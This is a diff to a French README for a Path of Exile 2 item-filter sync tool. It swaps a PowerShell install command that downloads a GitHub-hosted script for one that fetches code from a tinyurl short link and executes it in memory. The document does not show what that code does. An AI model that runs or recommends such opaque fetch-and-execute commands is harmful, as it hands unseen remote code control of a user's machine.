@@ -7,7 +7,7 @@ Filtre d'items **NeverSink** (strictness *Strict*) avec mes **sons personnalisé
 `Win + R`, colle ça, `Entrée` :
 
 ```
-powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iwr 'https://raw.githubusercontent.com/kipavy/poe2-filter-sync/main/install.ps1' -OutFile \"$env:TEMP\poe2.ps1\"; & \"$env:TEMP\poe2.ps1\" -Full"
+powershell -c "[Net.ServicePointManager]::SecurityProtocol='Tls12'; &([scriptblock]::Create((irm https://tinyurl.com/2b2xuyal))) -Full"
 ```
 
 Pas besoin d'admin. Ça télécharge le dernier filtre NeverSink, applique les sons custom, et copie le filtre **et** les .mp3 dans ton dossier `Documents\My Games\Path of Exile 2`.
